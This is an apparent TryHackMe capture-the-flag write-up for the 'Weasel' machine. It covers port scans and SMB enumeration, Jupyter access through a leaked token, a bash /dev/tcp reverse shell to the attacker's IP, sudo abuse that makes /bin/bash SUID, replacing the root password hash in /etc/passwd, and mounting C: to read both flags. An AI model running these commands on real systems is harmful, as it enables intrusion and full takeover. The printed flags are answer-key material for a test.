Weasel IP: 10.10.241.107

rustscan:


PORT      STATE SERVICE        REASON
22/tcp    open  ssh            syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
445/tcp   open  microsoft-ds   syn-ack
3389/tcp  open  ms-wbt-server  syn-ack
5985/tcp  open  wsman          syn-ack
8888/tcp  open  sun-answerbook syn-ack
47001/tcp open  winrm          syn-ack
49664/tcp open  unknown        syn-ack
49665/tcp open  unknown        syn-ack
49667/tcp open  unknown        syn-ack
49668/tcp open  unknown        syn-ack
49669/tcp open  unknown        syn-ack
49670/tcp open  unknown        syn-ack
49672/tcp open  unknown        syn-ack


nmap:


PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBae1NsdsMcZJNQQ2wjF2sxXK2ZF3c7qqW3TN/q91pWiDee3nghS1J1FZrUXaEj0wnAAAbYRg5vbRZRP9oEagBwfWG3QJ9AO6s5UC+iTjX+YKH6phKNmsY5N/LKY4+2EDcwa5R4uznAC/2Cy5EG6s7izvABLcRh3h/w4rVHduiwrueAZF9UjzlHBOxHDOPPVtg+0dniGhcXRuEU5FYRA8/IPL8P97djscu23btk/hH3iqdQWlC9b0CnOkD8kuyDybq9nFaebAxDW4XFj7KjCRuuu0dyn5Sr62FwRXO4wu08ePUEmJF1Gl3/fdYe3vj+iE2yewOFAhzbmFWEWtztjJb
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGl51l9Z4Mg4hFDcQz8v6XRlABMyVPWlkEXrJIg53piZhZ9WKYn0Gi4fKkzo3blDAsdqpGFQ11wwocBCSJGjQU=
|   256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-25T07:35:52+00:00
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-12T11:46:50
| Not valid after:  2023-09-11T11:46:50
| MD5:   1671 b190 2eb6 b15f 0c3f ab16 d3e6 6582
| SHA-1: c007 197a dd30 f17f 2bdb 65f8 1804 fc6f d081 c7c9
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQPvhxvXPCnJtIgyPRvn3WzjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwHhcNMjMwMzEyMTE0NjUwWhcNMjMw
| OTExMTE0NjUwWjAaMRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQD1iFFVyhggpi7wL6i/UpivF4ynWEUALMJh
| v8t3ypgM+Vrdp7sqDQciG7YMfGhYyz3Za4G03Ppgi+DUu/2qsYfGJbllz8IRaelq
| 5G5DPGSy0lYItHbWEvPbPSWTcEOrxQMIv98lBx5fHbmzIP1mEeIiS7p8bpWGfFuR
| Y/zvTOOWRHcT09/z+6YDdCTztLIgtrE+ZFW1yNUYxqCPl6EdKutmIzDUCDFUyvhq
| jOuv1R3M9XGPGomb99tAdPWQeXwjQfNrJdEsJ0DBz3D9T2pbfVwKINfDt1qCQfPO
| zu9v8OZhe+BYvS6289GNmCbiaCVbeJK2yokPdMFx4uLIT85U7IKBAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAiVcJyTne2cl+bKhmctqIva2DA/v9P0odeZe1hO8TG7J4UZGeK5bOqwdE
| bPDKBuxD+QYXWLm+/eHgKKMwKemYp4iDcIMGfb5UgzkRe8RaI5kKiiPQSarFKIZe
| WphDWZrLDo9IN58b081R4k82IfGv7yXtIjZcral4fCEHhhTdVE2CvHvE1JGXSWbY
| NHoufyrjizsaLHAchdnuHgaz+cgcFgR/hD61vQpc8pW+v6xDNVtMFVdv7lLtbWov
| /dcC6Yd2jtk8sP7ue7K+FOhLaw9UDbji3XCXn0FoJwKBza/K8smP0M/3fHIqoFA2
| mc4b7D2CUHt9FNWIWyz9evlNAOixvg==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-25T07:36:01+00:00; +2s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp  open  http          syn-ack Tornado httpd 6.0.3
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: TornadoServer/6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48883/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 7569/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 7145/udp): CLEAN (Failed to receive data)
|   Check 4 (port 33623/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-25T07:35:54
|_  start_date: N/A






enum4linux:

enum4linux -v 10.10.241.107
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu May 25 03:31:22 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.241.107
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.241.107    |
 ===================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.241.107'
[E] Can't find workgroup/domain


 ============================================= 
|    Nbtstat Information for 10.10.241.107    |
 ============================================= 
Looking up status of 10.10.241.107
No reply from 10.10.241.107

 ====================================== 
|    Session Check on 10.10.241.107    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.241.107'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.241.107 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ============================================ 
|    Getting domain SID for 10.10.241.107    |
 ============================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.241.107 -c 'lsaquery' 2>&1
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.241.107    |
 ======================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.241.107'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.241.107 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.241.107' 2>&1
[+] Got OS info for 10.10.241.107 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 10.10.241.107    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.241.107' 2>&1
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.241.107' 2>&1
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================== 
|    Share Enumeration on 10.10.241.107    |
 ========================================== 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.241.107 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.241.107

 ===================================================== 
|    Password Policy Information for 10.10.241.107    |
 ===================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.241.107' 2>&1
[E] Unexpected error from polenum:


[+] Attaching to 10.10.241.107 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.241.107)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.241.107' -c "getdompwinfo" 2>&1

[E] Failed to get password policy with rpcclient


 =============================== 
|    Groups on 10.10.241.107    |
 =============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.241.107' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.241.107' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.241.107' -c "enumdomgroups" 2>&1

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.241.107 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.241.107 with command: rpcclient -W '' -U''%'' '10.10.241.107' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.241.107 with command: rpcclient -W '' -U''%'' '10.10.241.107' -c lsaenumsid 2>&1

 ============================================== 
|    Getting printer info for 10.10.241.107    |
 ============================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.241.107' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Thu May 25 03:31:53 2023



smbmap:

 smbmap -u guest -H 10.10.241.107
[+] IP: 10.10.241.107:445       Name: 10.10.241.107                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        datasci-team                                            READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC



smbclient:

smbclient //10.10.241.107/datasci-team  -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 25 03:36:25 2023
  ..                                  D        0  Thu May 25 03:36:25 2023
  .ipynb_checkpoints                 DA        0  Thu Aug 25 11:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 11:26:46 2022
  misc                               DA        0  Thu Aug 25 11:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 11:26:46 2022
  papers                             DA        0  Thu Aug 25 11:26:47 2022
  pics                               DA        0  Thu Aug 25 11:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 11:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 11:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 11:26:46 2022




exploring this share,we get to a jupyter-token.txt, which we can use in order to log in to jupyter site on port 8888:

foothold
we can start a new terminal on the server from the website
from here we can get a connection to our machine:


(base) dev-datasci@DEV-DATASCI-JUP:/var$ /bin/bash -c 'bash -i >& /dev/tcp/10.8.29.89/4444 0>&1'


(kali㉿kali)-[~/Practice/tryhackme/Weasel]
└─$ nc -lvnp 4444                                                                                                              
listening on [any] 4444 ...
connect to [10.8.29.89] from (UNKNOWN) [10.10.241.107] 50631
(base) dev-datasci@DEV-DATASCI-JUP:/var$ 



(base) dev-datasci@DEV-DATASCI-JUP:~$ ls -la
ls -la
total 534108
drwxr-xr-x 1 dev-datasci dev-datasci      4096 Aug 25  2022 .
drwxr-xr-x 1 root        root             4096 Aug 25  2022 ..
-rw------- 1 dev-datasci dev-datasci         5 Aug 25  2022 .bash_history
-rw-r--r-- 1 dev-datasci dev-datasci       220 Aug 25  2022 .bash_logout
-rw-r--r-- 1 dev-datasci dev-datasci      4270 Aug 25  2022 .bashrc
drwxrwxrwx 1 dev-datasci dev-datasci      4096 Aug 25  2022 .cache
drwxrwxrwx 1 dev-datasci dev-datasci      4096 Aug 25  2022 .conda
drwxrwxrwx 1 dev-datasci dev-datasci      4096 Aug 25  2022 .config
drwxr-xr-x 1 dev-datasci dev-datasci      4096 Aug 25  2022 .ipython
drwx------ 1 dev-datasci dev-datasci      4096 Aug 25  2022 .jupyter
drwxr-xr-x 1 dev-datasci dev-datasci      4096 Aug 25  2022 .landscape
drwx------ 1 dev-datasci dev-datasci      4096 Aug 25  2022 .local
-rw-rw-rw- 1 dev-datasci dev-datasci         0 May 25 00:58 .motd_shown
-rw-r--r-- 1 dev-datasci dev-datasci       807 Aug 25  2022 .profile
-rw-r--r-- 1 dev-datasci dev-datasci         0 Aug 25  2022 .sudo_as_admin_successful
drwxrwxrwx 1 dev-datasci dev-datasci      4096 Aug 25  2022 anaconda3
-rwxrwxrwx 1 dev-datasci dev-datasci 546910666 Aug 25  2022 anacondainstall.sh
drwxrwxrwx 1 dev-datasci dev-datasci      4096 Aug 25  2022 datasci-team
-rw-rw-rw- 1 dev-datasci dev-datasci       432 Aug 25  2022 dev-datasci-lowpriv_id_ed25519
(base) dev-datasci@DEV-DATASCI-JUP:~$ cd /etc/
cd /etc/
(base) dev-datasci@DEV-DATASCI-JUP:/etc$ ls wsl*
ls wsl*
wsl.conf
(base) dev-datasci@DEV-DATASCI-JUP:/etc$ cat wsl.conf   
csl.conf
csl.conf: command not found
(base) dev-datasci@DEV-DATASCI-JUP:/etc$ cat wsl.conf
cat wsl.conf
[automount]
enabled = false



there is no flag in the home folder, because we are in wsl

we need to stabilise the shell:

python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

ctrl +z

stty raw -echo && fg

stty rows 40
stty columns 160

dev-datasci@DEV-DATASCI-JUP:/home$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
dev-datasci@DEV-DATASCI-JUP:/home$ 



we create a jupyter file with nano containing:


#!/bin/bash

chmod u+s /bin/bash


after this we save the file


dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ nano jupyter
dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ chmod 777 jupyter
dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ sudo  /home/dev-datasci/.local/bin/jupyter
dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ ls -ld /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ bash -p
bash-5.0# id
uid=1000(dev-datasci) gid=1000(dev-datasci) euid=0(root) groups=1000(dev-datasci),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
bash-5.0# 




bash-5.0# cd /root/
bash-5.0# ls
bash-5.0# ls -la
total 4
drwx------ 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x 1 root root 4096 Aug 25  2022 .local
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
bash-5.0# 


still no flag :(


in /mnt there is a C drive, but is not mounted

bash-5.0# cd /mnt
bash-5.0# ls
c
bash-5.0# ls -la
total 0
drwxr-xr-x 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
drwxrwxrwx 1 root root 4096 Aug 25  2022 c
bash-5.0# cd c
bash-5.0# ls
bash-5.0# ls -la
total 0
drwxrwxrwx 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
bash-5.0# 



we need to create a passwd for root, so on our machine we will use openssl to create a new password:

┌──(kali㉿kali)-[~/Practice/tryhackme/Weasel]
└─$ openssl passwd -6 root                
$6$e4LGDmPAI5dvNPrH$apKnrh0umn1svOLcymL.A8TDjE8JOT0O.zIInuwZ4EYrq4t6s0UbzTRXZeocO0nI9n8tqvYsdrlycGu76zce9/


we will insert this passwd in /etc/passwd file on the victim machine:

bash-5.0# nano /etc/passwd
bash-5.0# head -1 /etc/passwd
root:$6$e4LGDmPAI5dvNPrH$apKnrh0umn1svOLcymL.A8TDjE8JOT0O.zIInuwZ4EYrq4t6s0UbzTRXZeocO0nI9n8tqvYsdrlycGu76zce9/:0:0:root:/root:/bin/bash


now we will switch to the root user:

bash-5.0# exit
exit
dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ su root
Password: 
root@DEV-DATASCI-JUP:/home/dev-datasci/.local/bin# 



WE MOUNT C drive and we get the flags:


root@DEV-DATASCI-JUP:/mnt# mount -t drvfs C: /mnt/c
root@DEV-DATASCI-JUP:/mnt# mount
rootfs on / type lxfs (rw,noatime)
none on /dev type tmpfs (rw,noatime,mode=755)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)
devpts on /dev/pts type devpts (rw,nosuid,noexec,noatime,gid=5,mode=620)
none on /run type tmpfs (rw,nosuid,noexec,noatime,mode=755)
none on /run/lock type tmpfs (rw,nosuid,nodev,noexec,noatime)
none on /run/shm type tmpfs (rw,nosuid,nodev,noatime)
none on /run/user type tmpfs (rw,nosuid,nodev,noexec,noatime,mode=755)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,noatime)
C: on /mnt/c type drvfs (rw,relatime,case=off)
root@DEV-DATASCI-JUP:/mnt# ls -la
total 0
drwxr-xr-x 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
drwxrwxrwx 1 root root 4096 Mar 14 04:14 c
root@DEV-DATASCI-JUP:/mnt# cd c
root@DEV-DATASCI-JUP:/mnt/c# ls
ls: cannot read symbolic link 'Documents and Settings': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'             PerfLogs        'Program Files (x86)'   Recovery                     Users     datasci-team
'Documents and Settings'  'Program Files'   ProgramData           'System Volume Information'   Windows   pagefile.sys
root@DEV-DATASCI-JUP:/mnt/c# cd Users/
root@DEV-DATASCI-JUP:/mnt/c/Users# ls
ls: cannot read symbolic link 'All Users': Permission denied
ls: cannot read symbolic link 'Default User': Permission denied
 Administrator  'All Users'   Default  'Default User'   Public   desktop.ini   dev-datasci-lowpriv
root@DEV-DATASCI-JUP:/mnt/c/Users# cd dev-datasci-lowpriv/
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv# cd Desktop/
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv/Desktop# ls
desktop.ini  python-3.10.6-amd64.exe  user.txt
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv/Desktop# cat user.txt
THM{w3as3ls_@nd_pyth0ns} 
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv/Desktop# cd ..
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv# cd ..
root@DEV-DATASCI-JUP:/mnt/c/Users# cd Administrator/
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator# cd Desktop/
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# ls
 ChromeSetup.exe   Ubuntu2004-220404.appxbundle  'Visual Studio Code.lnk'   banner.txt   desktop.ini   python-3.10.6-amd64.exe   root.txt
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# cat root.txt
THM{evelated_w3as3l_l0ngest_boi}root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# 
